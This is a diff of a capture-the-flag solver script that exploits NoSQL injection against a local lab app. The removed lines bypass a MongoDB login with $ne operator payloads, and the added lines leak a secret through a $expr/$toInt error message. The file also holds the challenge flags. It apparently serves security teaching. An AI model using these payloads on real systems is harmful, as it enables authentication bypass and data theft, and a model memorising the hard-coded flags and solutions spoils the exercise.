@@ -1,100 +1,62 @@
 #!/usr/bin/env bash
-# solvers/p4_2.sh, Task 4.2 "Bypassing the Archive Guardian" canonical exploit.
+# solvers/p4_2.sh, Task 4.2 "The Diagnostic Desk" canonical exploit.
 #
-# The guardian console's login route builds its MongoDB query directly out
-# of raw request input:
-#
-#     db.agents.find_one({"username": username, "password": password})
-#
-# and never checks that either field is actually a string before it reaches
-# that query (challenges/phase4.py, p4_2 block). An ordinary caller sends
-# two flat strings and gets an ordinary two-field equality match, ordinary
-# login behavior. But if `username`/`password` arrive as *dicts* instead,
-# `{"$ne": null}` in a JSON body, or `username[$ne]=1&password[$ne]=1` as
-# form-encoded bracket-notation keys (rebuilt into the same nested dict
-# app-side), MongoDB doesn't compare the dict as a literal. It honors it
-# as a real operator: "$ne": null/1 matches any document where that field
-# exists and isn't literally null/1, i.e. every seeded agent. The query
-# matches without supplying a single real credential, and the route logs
-# the caller in as whatever `find_one` (no explicit sort, real MongoDB
-# natural order) returns first.
-#
-# This script proves three things against the live stack, in order:
-#
-#   1. A normal wrong-password login (two plain strings) genuinely FAILS,
-#      this isn't "any input logs you in," it's specifically the operator
-#      injection that works.
-#   2. The form-encoded bracket-notation bypass (username[$ne]=1&
-#      password[$ne]=1) logs in as the guardian account and reveals the
-#      flag.
-#   3. The equivalent JSON-body bypass ({"$ne": null} on both fields) does
-#      the same, over a completely different request-parsing path.
+# Same {field: value} -> MongoDB sink as p4_3's Records Room, but this
+# console does not swallow driver exceptions. Two techniques, in order:
+#   1. Detection: a deliberately malformed/unknown operator produces a
+#      distinct OperationFailure, confirming the injection exists without
+#      needing to infer it from boolean behavior.
+#   2. Weaponization: field="$expr" + a $toInt conversion against the real
+#      field forces MongoDB to try (and fail) to parse the flag as a
+#      number, and the resulting error message embeds the flag verbatim,
+#      a one-shot leak, no blind walking required.
 set -uo pipefail
 
 BASE="${SEIYAKU_BASE:-http://localhost:8000}"
-FLAG="SEIYAKU{ne_null_walks_in}"
-ROUTE="${BASE}/p4/guardian"
-
-fail=0
+FLAG="SEIYAKU{the_error_said_it_all}"
+ROUTE="${BASE}/p4/diagnostics"
 
 echo "[p4_2] target: ${ROUTE}"
 
-# --- Step 1: a genuine wrong-password login must FAIL --------------------
-echo "[p4_2] step 1: legitimate login with a wrong/guessed plain-string password"
-echo "  POST username=guardian&password=totally-wrong-guess"
-
-legit_resp=$(curl -s -X POST "$ROUTE" \
-    -H "Accept: application/json" \
-    --data-urlencode "username=guardian" \
-    --data-urlencode "password=totally-wrong-guess")
-echo "  response: ${legit_resp}"
-
-if echo "$legit_resp" | grep -qF "$FLAG"; then
-    echo "[p4_2] FAIL: a wrong plain-string password logged in successfully, the"
-    echo "  route is accepting any credential, not specifically the operator"
-    echo "  injection this lesson is about."
-    fail=1
+# --- Step 1: detection via a deliberately malformed/unknown operator -------
+echo "[p4_2] step 1: confirm injection via an unknown-operator error"
+DETECT=$(curl -s -G "$ROUTE" -H "Accept: application/json" \
+    --data-urlencode "field=archive_key" \
+    --data-urlencode 'value[$regexx]=x')
+if echo "$DETECT" | grep -qi "unknown operator"; then
+    echo "  ok: unknown-operator error surfaced, injection confirmed in one request"
+    echo "  response: $DETECT"
 else
-    echo "  ok: wrong plain-string password was correctly rejected (no flag)"
-fi
-
-# --- Step 2: form-encoded bracket-notation operator bypass ---------------
-echo "[p4_2] step 2: form-encoded bypass: username[\$ne]=1&password[\$ne]=1"
-
-form_resp=$(curl -s -X POST "$ROUTE" \
-    -H "Accept: application/json" \
-    --data-urlencode 'username[$ne]=1' \
-    --data-urlencode 'password[$ne]=1')
-echo "  response: ${form_resp}"
-
-if echo "$form_resp" | grep -qF "$FLAG"; then
-    echo "  ok: form-encoded \$ne bypass logged in as the guardian, flag recovered: ${FLAG}"
-else
-    echo "[p4_2] FAIL: flag did not appear in the form-encoded bypass response"
-    fail=1
-fi
-
-# --- Step 3: JSON-body operator bypass ------------------------------------
-echo '[p4_2] step 3: JSON-body bypass: {"username":{"$ne":null},"password":{"$ne":null}}'
-
-json_resp=$(curl -s -X POST "$ROUTE" \
-    -H "Content-Type: application/json" \
-    -H "Accept: application/json" \
-    -d '{"username":{"$ne":null},"password":{"$ne":null}}')
-echo "  response: ${json_resp}"
-
-if echo "$json_resp" | grep -qF "$FLAG"; then
-    echo "  ok: JSON-body \$ne bypass logged in as the guardian, flag recovered: ${FLAG}"
-else
-    echo "[p4_2] FAIL: flag did not appear in the JSON-body bypass response"
-    fail=1
-fi
-
-if [ "$fail" -ne 0 ]; then
-    echo "[p4_2] FAIL"
+    echo "[p4_2] FAIL: expected an 'unknown operator' error, got: $DETECT"
     exit 1
 fi
 
-echo "[p4_2] ok: wrong password rejected, both bypass styles logged in as the guardian"
+# --- Step 2: confirm a WELL-FORMED unknown field still reads as a quiet ----
+# miss (no error), proving step 1's signal is specifically about malformed
+# operators, not just "any query against this console produces an error".
+echo "[p4_2] step 2: confirm an ordinary miss produces no error (sanity check)"
+MISS=$(curl -s -G "$ROUTE" -H "Accept: application/json" \
+    --data-urlencode "field=archive_key" --data-urlencode "value=nope")
+if echo "$MISS" | python3 -c "import json,sys; d=json.load(sys.stdin); exit(0 if d.get('error') is None and d.get('matched') is False else 1)"; then
+    echo "  ok: ordinary miss is error:null, matched:false, as expected"
+else
+    echo "[p4_2] FAIL: ordinary miss did not read as a quiet non-match: $MISS"
+    exit 1
+fi
+
+# --- Step 3: the one-shot $expr + $toInt leak -------------------------------
+echo "[p4_2] step 3: one-shot leak via \$expr + \$toInt conversion failure"
+LEAK=$(curl -s -X POST "$ROUTE" -H "Content-Type: application/json" -H "Accept: application/json" \
+    -d '{"field":"$expr","value":{"$eq":["$archive_key",{"$toInt":"$archive_key"}]}}')
+echo "  response: $LEAK"
+if echo "$LEAK" | grep -qF "$FLAG"; then
+    echo "  ok: flag recovered directly from the \$convert error message: ${FLAG}"
+else
+    echo "[p4_2] FAIL: flag did not appear in the \$convert error message"
+    exit 1
+fi
+
+echo "[p4_2] ok: detection confirmed injection in one request, weaponization"
+echo "[p4_2]     leaked the flag in one more, no blind walking anywhere"
 echo "[p4_2] PASS"
 exit 0
